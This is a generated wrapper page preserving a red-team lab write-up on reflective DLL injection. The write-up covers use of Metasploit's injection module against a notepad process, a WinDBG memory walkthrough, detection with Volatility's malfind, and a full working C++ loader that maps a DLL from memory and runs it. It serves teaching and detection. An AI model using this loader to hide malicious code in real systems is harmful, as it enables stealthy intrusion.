---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Reflective DLL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-reflective-dll-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/reflective-dll-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Reflective DLL Injection](../../topics/offensive-security/reflective-dll-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-reflective-dll-injection |
| name | Reflective DLL Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/reflective-dll-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (196).png
- image (197).png
- image (198).png
- image (199).png
- reflective-dll-bp-hit.png
- reflective-dll-gif.gif
- reflective-dll-injection-mem-analysis.png
- reflective-dll-injection-new-thread.png
- reflective-dll-injection-range.png
- reflective-dll-injection-strings.png
- reflective-dll-injection-variables.png
- reflective-dll-options (1).png
- reflective-dll-strings.gif
- reflective-dll-volatility.png
- reflectivedll-messagebox.gif
- user32.gif
_body: "---\ndescription: Loading DLL from memory\n---\n\n# Reflective DLL Injection\n\nReflective DLL injection is a technique\
  \ that allows an attacker to inject a DLL's into a victim process **from memory** rather than disk.\n\n## Purpose\n\nThe\
  \ purpose of this lab is to:\n\n* Test reflective DLL injection capability in metasploit\n* Goof around with basic memory\
  \ forensics\n* Implement a simple reflective DLL injection POC by myself\n\n## Technique Overview\n\nThe way the reflective\
  \ injection works is nicely described by the technique's original author Stephen Fewer [here](https://github.com/stephenfewer/ReflectiveDLLInjection):\n\
  \n> * Execution is passed, either via CreateRemoteThread() or a tiny bootstrap shellcode, to the library's ReflectiveLoader\
  \ function which is an exported function found in the library's export table.\n> * As the library's image will currently\
  \ exists in an arbitrary location in memory the ReflectiveLoader will first calculate its own image's current location in\
  \ memory so as to be able to parse its own headers for use later on.\n> * The ReflectiveLoader will then parse the host\
  \ processes kernel32.dll export table in order to calculate the addresses of three functions required by the loader, namely\
  \ LoadLibraryA, GetProcAddress and VirtualAlloc.\n> * The ReflectiveLoader will now allocate a continuous region of memory\
  \ into which it will proceed to load its own image. The location is not important as the loader will correctly relocate\
  \ the image later on.\n> * The library's headers and sections are loaded into their new locations in memory.\n> * The ReflectiveLoader\
  \ will then process the newly loaded copy of its image's import table, loading any additional library's and resolving their\
  \ respective imported function addresses.\n> * The ReflectiveLoader will then process the newly loaded copy of its image's\
  \ relocation table.\n> * The ReflectiveLoader will then call its newly loaded image's entry point function, DllMain with\
  \ DLL\\_PROCESS\\_ATTACH. The library has now been successfully loaded into memory.\n> * Finally the ReflectiveLoader will\
  \ return execution to the initial bootstrap shellcode which called it, or if it was called via CreateRemoteThread, the thread\
  \ will terminate.\n\n## Execution\n\nThis lab assumes that the attacker has already gained a meterpreter shell from the\
  \ victim system and will now attempt to perform a reflective DLL injection into a remote process on a compromised victim\
  \ system, more specifically into a `notepad.exe` process with PID `6156`\n\nMetasploit's post-exploitation module `windows/manage/reflective_dll_inject`\
  \ configured:\n\n![](<../../.gitbook/assets/reflective-dll-options (1).png>)\n\n{% hint style=\"info\" %}\n`Reflective_dll.x64.dll`\
  \ is the DLL compiled from Steven Fewer's [reflective dll injection](https://github.com/stephenfewer/ReflectiveDLLInjection)\
  \ project on github.\n{% endhint %}\n\nAfter executing the post exploitation module, the below graphic shows how the notepad.exe\
  \ executes the malicious payload that came from a reflective DLL that was sent over the wire from the attacker's system:\n\
  \n![](../../.gitbook/assets/reflective-dll-gif.gif)\n\n## Observations\n\nOnce the metasploit's post-exploitation module\
  \ is run, the procmon accurately registers that notepad created a new thread:\n\n![](../../.gitbook/assets/reflective-dll-injection-new-thread.png)\n\
  \nLet's see if we can locate where the contents of `reflective_dll.x64.dll` are injected into the victim process when the\
  \ metasploit's post-exploitation module executes.\n\nFor that, lets debug notepad in WinDBG and set up a breakpoint for\
  \ `MessageBoxA` as shown below and run the post-exploitation module again:\n\n```cpp\n0:007> bp MessageBoxA\n0:007> bl\n\
  0 e 00000000`77331304     0001 (0001)  0:**** USER32!MessageBoxA\n```\n\nThe breakpoint is hit:\n\n![](../../.gitbook/assets/reflective-dll-bp-hit.png)\n\
  \nAt this point, we can inspect the stack with `kv` and see the call trace. A couple of points to note here:\n\n* return\
  \ address the code will jump to after the `USER32!MessageBoxA` finishes is `00000000031e103e`\n* inspecting assembly instructions\
  \ around `00000000031e103e`, we see a call instruction `call qword ptr [00000000031e9208]`\n* inspecting bytes stored in\
  \ `00000000031e9208`, (`dd 00000000031e9208 L1`) we can see they look like a memory address `0000000077331304` (note this\
  \ address)\n* inspecting the EIP pointer (`r eip`) where the code execution is paused at the moment, we see that it is the\
  \ same `0000000077331304` address, which means that the earlier mentioned instruction `call qword ptr [00000000031e9208]`\
  \ is the actual call to `USER32!MessageBoxA`\n* This means that prior to the above mentioned instruction, there must be\
  \ references to the variables that are passed to the `MessageBoxA` function:\n\n![](../../.gitbook/assets/reflective-dll-injection-mem-analysis.png)\n\
  \nIf we inspect the `00000000031e103e` 0x30 bytes earlier, we can see some suspect memory addresses and the call instruction\
  \ almost immediatley after that:\n\n![](../../.gitbook/assets/reflective-dll-injection-variables.png)\n\nUpon inspecting\
  \ those two addresses - they are indeed holding the values the `MessageBoxA` prints out upon successful DLL injection into\
  \ the victim process:\n\n```cpp\n0:007> da 00000000`031e92c8\n00000000`031e92c8  \"Reflective Dll Injection\"\n0:007> da\
  \ 00000000`031e92e8\n00000000`031e92e8  \"Hello from DllMain!\"\n```\n\n![](../../.gitbook/assets/reflective-dll-injection-strings.png)\n\
  \nLooking at the output of the `!address` function and correlating it with the addresses the variables are stored at, it\
  \ can be derived that the memory region allocated for the evil dll is located in the range `031e0000 - 031f7000`:\n\n![](../../.gitbook/assets/reflective-dll-injection-range.png)\n\
  \nIndeed, if we look at the `031e0000`, we can see the executable header (MZ) and the strings fed into the `MessageBoxA`\
  \ API can be also found further into the binary:\n\n![](../../.gitbook/assets/reflective-dll-strings.gif)\n\n## Detecting\
  \ Reflective DLL Injection with Volatility\n\n`Malfind` is the Volatility's pluging responsible for finding various types\
  \ of code injection and reflective DLL injection can usually be detected with the help of this plugin.&#x20;\n\nThe plugin,\
  \ at a high level will scan through various memory regions described by Virtual Address Descriptors (VADs) and look for\
  \ any regions with `PAGE_EXECUTE_READWRITE` memory protection and then check for the magic bytes `4d5a` (MZ in ASCII) at\
  \ the very beginning of those regions as those bytes signify the start of a Windows executable (i.e exe, dll):\n\n```csharp\n\
  volatility -f /mnt/memdumps/w7-reflective-dll.bin malfind --profile Win7SP1x64\n```\n\nNote how in our case, volatility\
  \ discovered the reflective dll injection we inspected manually above with WindDBG:\n\n![](../../.gitbook/assets/reflective-dll-volatility.png)\n\
  \n## Implementing Reflective DLL Injection\n\nI wanted to program a simplified Reflective DLL Injection POC to make sure\
  \ I understood its internals, so this is my attempt and its high level workflow of how I've implemented it:\n\n1. Read raw\
  \ DLL bytes into a memory buffer\n2. Parse DLL headers and get the SizeOfImage\n3. Allocate new memory space for the DLL\
  \ of size `SizeOfImage`\n4. Copy over DLL headers and PE sections to the memory space allocated in step 3\n5. Perform image\
  \ base relocations\n6. Load DLL imported libraries\n7. Resolve Import Address Table (IAT)\n8. Invoke the DLL with `DLL_PROCESS_ATTACH`\
  \ reason\n\nSteps 1-4 are pretty straight-forward as seen from the code below. For step 5 related to image base relocations,\
  \ see my notes [T1093: Process Hollowing and Portable Executable Relocations](process-hollowing-and-pe-image-relocations.md#relocation)\n\
  \n### Resolving Import Address Table\n\nPortable Executables (PE) use Import Address Table (IAT) to lookup function names\
  \ and their memory addresses when they need to be called during runtime.\n\nWhen dealing with reflective DLLs, we need to\
  \ load all the dependent libraries of the DLL into the current process and fix up the IAT to make sure that the functions\
  \ that the DLL imports point to correct function addresses in the current process memory space.\n\nIn order to load the\
  \ depending libraries, we need to parse the DLL headers and:\n\n1. Get a pointer to the first Import Descriptor\n2. From\
  \ the descriptor, get a pointer to the imported library name\n3. Load the library into the current process with `LoadLibrary`\n\
  4. Repeat process until all Import Descriptos have been walked through and all depending libraries loaded\n\nBefore proceeding,\
  \ note that my test DLL I will be using for this POC is just a simple MessageBox that gets called once the DLL is loaded\
  \ into the process:\n\n![](<../../.gitbook/assets/image (199).png>)\n\nBelow shows the first Import Descriptor of my test\
  \ DLL. The first descriptor suggests that the DLL imports User32.dll and its function MessageBoxA. On the left, we can see\
  \ a correctly resolved library name that is about to be loaded into the memory process with `LoadLibrary`:\n\n![](<../../.gitbook/assets/image\
  \ (196).png>)\n\nBelow shows that the user32.dll gets loaded successfully:\n\n![](../../.gitbook/assets/user32.gif)\n\n\
  After the Import Descriptor is read and its corresponding library is loaded, we need to loop through all the thunks (data\
  \ structures describing functions the library imports), resolve their addresses using `GetProcAddress` and put them into\
  \ the IAT so that the DLL can reference them when needed:\n\n![](<../../.gitbook/assets/image (197).png>)\n\n![](<../../.gitbook/assets/image\
  \ (198).png>)\n\nOnce we have looped through all the Import Decriptors and their thunks, the IAT is considered resolved\
  \ and we can now execute the DLL. Below shows a successfully loaded and executed DLL that pops a message box:\n\n![](../../.gitbook/assets/reflectivedll-messagebox.gif)\n\
  \n### Code\n\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include <Windows.h>\n\ntypedef struct BASE_RELOCATION_BLOCK\
  \ {\n\tDWORD PageAddress;\n\tDWORD BlockSize;\n} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;\n\ntypedef struct BASE_RELOCATION_ENTRY\
  \ {\n\tUSHORT Offset : 12;\n\tUSHORT Type : 4;\n} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;\n\nusing DLLEntry = BOOL(WINAPI\
  \ *)(HINSTANCE dll, DWORD reason, LPVOID reserved);\n\nint main()\n{\n\t// get this module's image base address\n\tPVOID\
  \ imageBase = GetModuleHandleA(NULL);\n\n\t// load DLL into memory\n\tHANDLE dll = CreateFileA(\"\\\\\\\\VBOXSVR\\\\Experiments\\\
  \\MLLoader\\\\MLLoader\\\\x64\\\\Debug\\\\dll.dll\", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);\n\tDWORD64 dllSize\
  \ = GetFileSize(dll, NULL);\n\tLPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);\n\tDWORD outSize\
  \ = 0; \n\tReadFile(dll, dllBytes, dllSize, &outSize, NULL);\n\n\t// get pointers to in-memory DLL headers\n\tPIMAGE_DOS_HEADER\
  \ dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;\n\tPIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);\n\
  \tSIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;\n\n\t// allocate new memory space for the DLL. Try to allocate\
  \ memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere\n\t//LPVOID dllBase\
  \ = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tLPVOID dllBase\
  \ = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\
  \t\t\t\n\t// get delta between this module's image base and the DLL that was read into memory\n\tDWORD_PTR deltaImageBase\
  \ = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;\n\n\t// copy over DLL image headers to the newly\
  \ allocated space for the DLL\n\tstd::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);\n\n\t// copy over\
  \ DLL image sections to the newly allocated space for the DLL\n\tPIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);\n\
  \tfor (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)\n\t{\n\t\tLPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase\
  \ + (DWORD_PTR)section->VirtualAddress);\n\t\tLPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);\n\
  \t\tstd::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);\n\t\tsection++;\n\t}\n\n\t// perform image base\
  \ relocations\n\tIMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n\
  \tDWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;\n\tDWORD relocationsProcessed = 0;\n\n\t\
  while (relocationsProcessed < relocations.Size) \n\t{\n\t\tPBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable\
  \ + relocationsProcessed);\n\t\trelocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);\n\t\tDWORD relocationsCount = (relocationBlock->BlockSize\
  \ - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);\n\t\tPBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable\
  \ + relocationsProcessed);\n\n\t\tfor (DWORD i = 0; i < relocationsCount; i++)\n\t\t{\n\t\t\trelocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);\n\
  \n\t\t\tif (relocationEntries[i].Type == 0)\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tDWORD_PTR relocationRVA = relocationBlock->PageAddress\
  \ + relocationEntries[i].Offset;\n\t\t\tDWORD_PTR addressToPatch = 0;\n\t\t\tReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase\
  \ + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);\n\t\t\taddressToPatch += deltaImageBase;\n\t\t\tstd::memcpy((PVOID)((DWORD_PTR)dllBase\
  \ + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));\n\t\t}\n\t}\n\t\n\t// resolve import address table\n\tPIMAGE_IMPORT_DESCRIPTOR\
  \ importDescriptor = NULL;\n\tIMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n\
  \timportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);\n\tLPCSTR libraryName\
  \ = \"\";\n\tHMODULE library = NULL;\n\n\twhile (importDescriptor->Name != NULL)\n\t{\n\t\tlibraryName = (LPCSTR)importDescriptor->Name\
  \ + (DWORD_PTR)dllBase;\n\t\tlibrary = LoadLibraryA(libraryName);\n\t\t\n\t\tif (library)\n\t\t{\n\t\t\tPIMAGE_THUNK_DATA\
  \ thunk = NULL;\n\t\t\tthunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);\n\n\t\t\twhile (thunk->u1.AddressOfData\
  \ != NULL)\n\t\t\t{\n\t\t\t\tif (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))\n\t\t\t\t{\n\t\t\t\t\tLPCSTR functionOrdinal\
  \ = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);\n\t\t\t\t\tthunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);\n\
  \t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tPIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase\
  \ + thunk->u1.AddressOfData);\n\t\t\t\t\tDWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);\n\
  \t\t\t\t\tthunk->u1.Function = functionAddress;\n\t\t\t\t}\n\t\t\t\t++thunk;\n\t\t\t}\n\t\t}\n\n\t\timportDescriptor++;\n\
  \t}\n\n\t// execute the loaded DLL\n\tDLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);\n\
  \t(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);\n\n\tCloseHandle(dll);\n\tHeapFree(GetProcessHeap(), 0, dllBytes);\n\
  \n\treturn 0;\n}\n```\n\n## References\n\n{% embed url=\"https://github.com/stephenfewer/ReflectiveDLLInjection\" %}\n\n\
  {% embed url=\"https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal\" %}\n\n{% embed url=\"https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/\"\
  \ %}\n\n{% embed url=\"https://github.com/nettitude/SimplePELoader/\" %}"
_relative_path: offensive-security/code-injection-process-injection/reflective-dll-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/reflective-dll-injection.md
````
